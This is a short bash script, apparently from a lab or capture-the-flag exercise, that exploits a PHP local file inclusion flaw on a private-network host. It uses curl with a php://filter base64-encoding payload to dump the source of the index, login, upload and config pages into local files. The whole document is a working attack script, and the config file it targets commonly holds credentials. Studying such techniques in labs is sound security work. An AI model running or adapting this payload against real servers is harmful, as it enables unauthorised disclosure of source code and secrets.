API_OPTION='show_paste'
FILES=('index' 'login' 'upload' 'config')

for paste_option in "${FILES[@]}"; do
	echo page=$paste_option successfully pulled
	curl -s http://192.168.80.131/?page=php://filter/convert.base64-encode/resource="$paste_option" > $paste_option.out
done
